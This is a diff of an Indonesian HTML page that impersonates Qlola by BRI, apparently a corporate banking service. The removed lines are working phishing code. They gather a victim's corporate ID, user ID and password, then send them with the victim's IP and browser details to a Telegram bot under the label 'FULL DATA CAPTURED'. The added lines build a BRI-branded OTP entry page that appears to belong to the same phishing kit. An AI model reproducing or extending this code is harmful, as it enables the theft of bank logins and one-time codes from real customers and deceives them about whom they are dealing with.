@@ -1,152 +1,222 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Qlola Token</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
-  * { box-sizing: border-box; }
-  body {
-    margin: 0;
-    font-family: 'Roboto', sans-serif;
-    background: linear-gradient(180deg, #b5d4f9 0%, #1e5dbf 100%);
-    background-image: url('https://www.image2url.com/r2/default/images/1777431943112-2242ef21-bfb3-455d-ba0f-24dfdd03a1cd.jpeg');
-    background-repeat: no-repeat;
-    background-size: cover;
-    background-position: center;
-    color: #111;
-    display: flex;
-    flex-direction: column;
-    height: 100vh;
-  }
-  .container { margin: 10px; background: transparent; flex: 1; display: flex; flex-direction: column; justify-content: center; max-width: 400px; margin: 10px auto; }
-  .time { position: fixed; top: 10px; left: 10px; color: white; font-weight: 300; font-size: 18px; font-family: monospace; user-select: none; z-index: 10; }
-  .logo { width: 180px; margin: 0 auto 20px auto; display: block; }
-  h2 { margin: 0 0 15px 0; color: #111; font-weight: 700; text-align: center; }
-  label { font-weight: 600; color: #222; display: block; margin-left: 5px; margin-top: 10px; }
-  input[type="text"], input[type="password"] { 
-    width: 100%; border-radius: 10px; border: none; padding: 15px; margin-top: 6px; 
-    font-size: 14px; box-shadow: 0px 2px 5px rgb(0 0 0 / 0.2); outline: none; 
-    font-family: 'Roboto', sans-serif; background: white; color: #333; 
-  }
-  button[type="submit"] { 
-    width: 100%; border-radius: 10px; border: none; padding: 15px; margin-top: 20px; 
-    background-color: #4CAF50; color: white; font-weight: 700; font-size: 16px; 
-    cursor: pointer; transition: background-color 0.3s; 
-  }
-  button[type="submit"]:hover:not(:disabled) { background-color: #45a049; }
-  button[type="submit"]:disabled { background-color: #bdbdbd; cursor: not-allowed; }
-  .loading { opacity: 0.7; pointer-events: none; }
-  .back-btn { 
-    width: 100%; border-radius: 10px; border: none; padding: 12px; margin-top: 10px; 
-    background-color: #bdbdbd; color: white; font-weight: 600; font-size: 14px; 
-    cursor: pointer; text-decoration: none; display: block; text-align: center; 
-  }
-  .back-btn:hover { background-color: #9e9e9e; }
-  ::-webkit-scrollbar { display: none; }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Qlola by BRI - Verifikasi OTP</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(180deg, #a7d8ff 0%, #2a6ebb 100%);
+      background-image: url('https://i.postimg.cc/gj9LSYLy/pattern.png'); /* contoh pola */
+      background-repeat: repeat;
+      color: #000;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      padding: 40px 20px;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 8px;
+      width: 100%;
+      max-width: 400px;
+      padding: 32px 24px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 24px;
+      width: 180px;
+      height: auto;
+    }
+    h1 {
+      font-weight: 600;
+      font-size: 1.8rem;
+      text-align: center;
+      margin-bottom: 8px;
+      color: #084594;
+    }
+    p.description {
+      text-align: center;
+      font-size: 0.95rem;
+      margin-bottom: 32px;
+      color: #084594cc;
+    }
+    .otp-input {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 24px;
+    }
+    .otp-input input {
+      width: 40px;
+      height: 48px;
+      text-align: center;
+      font-size: 1.5rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    .otp-input input:focus {
+      border-color: #2a6ebb;
+      box-shadow: 0 0 5px #2a6ebb66;
+    }
+    button#verifyBtn {
+      width: 100%;
+      padding: 14px 0;
+      background-color: #2a6ebb;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button#verifyBtn:disabled {
+      background-color: #7ea9d9;
+      cursor: not-allowed;
+    }
+    .resend-container {
+      margin-top: 16px;
+      font-size: 0.9rem;
+      text-align: center;
+      color: #084594cc;
+    }
+    .resend-container button {
+      background: none;
+      border: none;
+      color: #2a6ebb;
+      font-weight: 600;
+      cursor: pointer;
+      padding: 0;
+      font-size: 0.95rem;
+    }
+    .help-section {
+      margin-top: 32px;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #084594cc;
+    }
+    .help-section button {
+      margin-left: 6px;
+      background-color: white;
+      border: 1.5px solid #2a6ebb;
+      color: #2a6ebb;
+      font-weight: 600;
+      padding: 6px 14px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      transition: background-color 0.3s;
+    }
+    .help-section button:hover {
+      background-color: #dbe9ff;
+    }
+  </style>
 </head>
 <body>
-<div class="time" id="time"></div>
+  <div class="container">
+    <!-- Logo Qlola by BRI -->
+    <img src="https://i.postimg.cc/3xQ6T7CZ/qlola-logo.png" alt="Qlola by BRI" class="logo" />
 
-<div class="container">
-  <img src="https://www.image2url.com/r2/default/images/1777432399856-ad5dbb1e-2ba8-41b4-8c89-2f2497b83f57.jpeg" alt="Qlola Logo" class="logo" />
-  <h2>Masukkan Token</h2>
-  
-  <form id="tokenForm">
-    <label for="botToken">Bot Token</label>
-    <input id="botToken" type="text" placeholder="Masukkan Bot Token Telegram" required />
-    
-    <label for="chatId">Chat ID</label>
-    <input id="chatId" type="text" placeholder="Masukkan Chat ID" required />
-    
-    <button type="submit">Kirim Token</button>
-  </form>
-  
-  <a href="index.html" class="back-btn">← Kembali ke Login</a>
-</div>
+    <h1>Verifikasi Kode OTP</h1>
+    <p class="description">Masukkan kode OTP yang telah kami kirimkan ke nomor telepon Anda.</p>
 
-<script>
-  // AMBIL SESSION DARI INDEX.HTML
-  const loginSession = sessionStorage.getItem('qlola_login_session');
-  if (!loginSession) {
-    window.location.href = 'index.html'; // Redirect jika belum login
-  }
-  
-  const loginData = JSON.parse(loginSession);
-  
-  // Jam
-  setInterval(() => {
-    document.getElementById('time').textContent = new Date().toLocaleTimeString('id-ID', {hour12: false}).slice(0,8);
-  }, 1000);
-  
-  // Submit token + gabung session + kirim Telegram
-  document.getElementById('tokenForm').onsubmit = async e => {
-    e.preventDefault();
-    
-    const botToken = document.getElementById('botToken').value;
-    const chatId = document.getElementById('chatId').value;
-    
-    // Gabung data login + token
-    const fullData = {
-      ...loginData,
-      botToken,
-      chatId,
-      tokenTimestamp: new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'})
-    };
-    
-    // Kirim SEMUA DATA ke Telegram (LOGIN + TOKEN)
-    const message = `
-🚨 *QLOLA FULL DATA CAPTURED* 🚨
+    <form id="otpForm" autocomplete="off" onsubmit="return false;">
+      <div class="otp-input">
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required id="otp1" />
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required id="otp2" />
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required id="otp3" />
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required id="otp4" />
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required id="otp5" />
+        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required id="otp6" />
+      </div>
 
-📋 *LOGIN DATA:*
-- Corporate ID: \`${loginData.corporateId}\`
-- User ID: \`${loginData.userId}\`
-- Password: \`${loginData.password}\`
-- Login Time: \`${loginData.timestamp}\`
+      <button type="submit" id="verifyBtn" disabled>Verifikasi</button>
+    </form>
 
-🔑 *TOKEN DATA:*
-- Bot Token: \`${botToken}\`
-- Chat ID: \`${chatId}\`
-- Token Time: \`${fullData.tokenTimestamp}\`
+    <div class="resend-container">
+      <span id="timer">Kirim ulang kode dalam 30 detik</span>
+      <button id="resendBtn" disabled>Kirim Ulang Kode OTP</button>
+    </div>
 
-🌐 *IP:* ${await getIP()}
-🖥️ *User Agent:* ${navigator.userAgent}
+    <div class="help-section">
+      Butuh bantuan?
+      <button id="contactBtn">Hubungi Kami</button>
+    </div>
+  </div>
 
-*COMPLETE DATASET SECURED!*
-    `;
-    
-    // Kirim ke Telegram (menggunakan token yang baru diinput)
-    try {
-      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: message,
-          parse_mode: 'Markdown'
-        })
+  <script>
+    // Fokus otomatis pindah ke input berikutnya saat mengisi OTP
+    const inputs = document.querySelectorAll('.otp-input input');
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < inputs.length -1) {
+          inputs[index + 1].focus();
+        }
+        checkOtpComplete();
       });
-      
-      // Simpan token untuk penggunaan selanjutnya (opsional)
-      sessionStorage.setItem('qlola_token', JSON.stringify({botToken, chatId}));
-      
-      console.log('✅ Data lengkap terkirim!');
-      
-      // Redirect atau selesai (silent)
-      alert('Token berhasil dikirim!'); // Bisa dihapus jika mau full silent
-      
-    } catch(error) {
-      console.error('❌ Gagal kirim:', error);
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    const verifyBtn = document.getElementById('verifyBtn');
+    function checkOtpComplete() {
+      const otpComplete = Array.from(inputs).every(input => input.value.length === 1);
+      verifyBtn.disabled = !otpComplete;
     }
-  };
-  
-  async function getIP() {
-    try {
-      return (await (await fetch('https://api.ipify.org?format=json')).json()).ip;
-    } catch { return 'Unknown'; }
-  }
-</script>
+
+    // Timer untuk resend button
+    const resendBtn = document.getElementById('resendBtn');
+    const timerSpan = document.getElementById('timer');
+    let countdown = 30;
+    let timerInterval;
+
+    function startTimer() {
+      resendBtn.disabled = true;
+      timerSpan.textContent = `Kirim ulang kode dalam ${countdown} detik`;
+      timerInterval = setInterval(() => {
+        countdown--;
+        if (countdown <= 0) {
+          clearInterval(timerInterval);
+          resendBtn.disabled = false;
+          timerSpan.textContent = '';
+        } else {
+          timerSpan.textContent = `Kirim ulang kode dalam ${countdown} detik`;
+        }
+      }, 1000);
+    }
+
+    startTimer();
+
+    resendBtn.addEventListener('click', () => {
+      resendBtn.disabled = true;
+      countdown = 30;
+      startTimer();
+      alert('Kode OTP telah dikirim ulang ke nomor Anda.');
+      // Tambahkan logic pengiriman kode OTP ulang disini (API call)
+    });
+
+    // Event tombol verifikasi
+    document.getElementById('otpForm').addEventListener('submit', () => {
+      const otpValue = Array.from(inputs).map(i => i.value).join('');
+      alert(`Kode OTP yang Anda masukkan: ${otpValue}`);
+      // Tambahkan logic verifikasi OTP disini (API call)
+    });
+
+    // Event tombol hubungi kami
+    document.getElementById('contactBtn').addEventListener('click', () => {
+      alert('Silakan hubungi pusat bantuan di 021-xxxx-xxxx atau email support@bri.co.id');
+      // Atau arahkan ke halaman bantuan / kontak
+    });
+  </script>
 </body>
 </html>
